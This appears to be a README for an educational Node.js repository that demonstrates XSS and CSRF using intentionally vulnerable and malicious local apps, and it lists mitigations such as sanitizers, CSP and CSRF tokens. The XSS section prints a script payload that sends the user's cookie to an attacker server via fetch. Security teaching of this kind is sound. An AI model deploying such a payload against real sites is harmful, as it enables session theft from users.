# Node Examples

Start by installing all the npm dependencies:

```bash
npm install
```

## Cross-site Scripting (XSS)

Start the vulnerable website ([http://localhost:3000/](http://localhost:3000/)):

```bash
node xss/vulnerable-app.js
```

Start the malicious website ([http://localhost:3001/](http://localhost:3001/)):

```bash
node xss/malicious-app.js
```

The attacker connects to the vulnerable website and edit the content of the HTML.
For instance, the following XSS injection sends the cookie of the user that visit the vulnerable website to a malicious website:

```html
<script>
    fetch("http://localhost:3001/steal?cookie=" + document.cookie)
        .then(response => response.text())
        .then(text => alert("Your secret has been stolen: " + text));
</script>
```

This kind of attack can be mitigated by using an HTML sanitizer and by configuring a content security policy (CSP) in the headers of the HTTP response.
Popular [HTML sanitizers](https://www.npmjs.com/search?q=html+sanitizer) can be found on the npm registry.

## Cross-site Request Forgery (CSRF)

Start the vulnerable website ([http://localhost:3000/](http://localhost:3000/)):

```bash
node csrf/vulnerable-app.js
```

Start the malicious website ([http://localhost:3001/](http://localhost:3001/)):

```bash
node csrf/malicious-app.js
```

The attacker sends an email or a message to the user that contains a link to the malicious website.
If the user is connected to the vulnerable website, the request forged by the malicious website is executed by the browser on the vulnerable website with the cookie of the user.

This kind of attack can be mitigated by using hidden CSRF tokens in HTML forms.
A plugin such as [csurf](https://github.com/expressjs/csurf) can be used to generate CSRF tokens in express applications.